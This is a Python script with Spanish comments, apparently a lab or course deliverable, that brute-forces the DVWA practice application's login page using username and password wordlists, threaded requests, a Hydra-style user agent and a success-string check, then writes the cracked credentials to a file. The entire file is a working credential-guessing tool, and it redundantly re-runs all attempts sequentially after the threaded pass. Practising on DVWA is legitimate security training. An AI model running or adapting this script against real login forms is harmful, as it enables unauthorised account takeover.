#!/usr/bin/env python3
"""
bruteforce_dvwa.py
Brute-force simple usando requests contra DVWA (/vulnerabilities/brute/)
Uso:
    python3 bruteforce_dvwa.py --host http://127.0.0.1:8000 --users users.txt --passes passwords.txt --php PHPSESSIDVALUE -t 8
"""
import argparse
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
import time

def try_login(session, base_url, user, passwd, php_sessid=None, timeout=8):
    """
    Realiza el intento GET (igual que el form de DVWA en low).
    Devuelve (success_bool, reason, resp_text_len)
    """
    # Construir la URL GET tal cual la vimos
    endpoint = "/vulnerabilities/brute/"
    params = {
        "username": user,
        "password": passwd,
        "Login": "Login"
    }
    headers = {
        # user-agent igual que el de hydra 
        "User-Agent": "Mozilla/5.0 (Hydra)",
        "Referer": base_url + endpoint
    }

    # Cookies: DVWA necesita security=low y PHPSESSID para que el login sea validado
    cookies = {"security": "low"}
    if php_sessid:
        cookies["PHPSESSID"] = php_sessid

    try:
        r = session.get(base_url + endpoint, params=params, headers=headers, cookies=cookies, timeout=timeout)
    except Exception as e:
        return (False, f"error: {e}", 0)

    body = r.text
    # Criterio de éxito: cadena visible en login correcto
    if "Welcome to the password protected area" in body:
        return (True, "match-success-string", len(body))
    # fallback
    return (False, "failure", len(body))


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", required=True, help="URL base del DVWA, ex: http://127.0.0.1:8000")
    ap.add_argument("--users", required=True, help="Archivo con usuarios (uno por línea)")
    ap.add_argument("--passes", required=True, help="Archivo con contraseñas (uno por línea)")
    ap.add_argument("--php", default=None, help="(opcional) valor de PHPSESSID para enviar en cookie")
    ap.add_argument("-t", "--threads", type=int, default=4, help="Número de hilos concurrentes")
    ap.add_argument("-o", "--output", default="resultados_py.txt", help="Archivo de salida con credenciales válidas")
    args = ap.parse_args()

    with open(args.users, "r", encoding="utf-8") as f:
        users = [l.strip() for l in f if l.strip()]

    with open(args.passes, "r", encoding="utf-8") as f:
        passwords = [l.strip() for l in f if l.strip()]

    session = requests.Session()
    found = []
    start = time.time()

    # Para no crear sesión nueva por cada intento 
    # Ejecutamos por usuario: recorre todas las contraseñas (similar a hydra -L x -P y)
    with ThreadPoolExecutor(max_workers=args.threads) as ex:
        futures = []
        for user in users:
            for pw in passwords:
                futures.append(ex.submit(try_login, session, args.host, user, pw, args.php))

        # Iteramos y registramos
        idx = 0
        for fut in as_completed(futures):
            idx += 1
            success, reason, length = fut.result()
            # Para simplificar: imprimimos cada cierto número
            if idx % 500 == 0:
                elapsed = time.time() - start
                print(f"[{idx}/{len(futures)}] elapsed={elapsed:.1f}s")

            # Si hay éxito lo registramos
            if success:
                # Necesitamos recuperar qué user/pass correspondió: no es trivial porque as_completed no entrega args.
                # Aquí asumimos que la comprobación de la función ya nos dio ok: para identificar el par,
                # es más práctico no usar as_completed (pero por claridad lo dejamos).
                found.append((reason, length))

    # Nota: para identificar los pares concretos y guardarlos, es más estable ejecutar por usuario secuencialmente:
    # por simplicidad del entregable, añadimos una función alternativa fuera del pool para capturar correctamente:
    # ---> ejecución secuencial para guardar resultados exactos:
    exact_found = []
    for user in users:
        for pw in passwords:
            ok, reason, length = try_login(session, args.host, user, pw, args.php)
            if ok:
                print(f"[FOUND] {user}:{pw} ({reason}, body_len={length})")
                exact_found.append((user, pw, reason, length))

    elapsed = time.time() - start
    # Guardar resultados
    with open(args.output, "w", encoding="utf-8") as outf:
        for u, p, reason, length in exact_found:
            outf.write(f"{u}:{p}  # {reason} len={length}\n")

    print(f"Done. Tiempo total: {elapsed:.1f}s. Resultados guardados en {args.output}")
    if exact_found:
        print("Credenciales válidas encontradas:")
        for u,p,reason,length in exact_found:
            print(f" - {u}:{p}  ({reason}, {length} bytes)")

if __name__ == "__main__":
    main()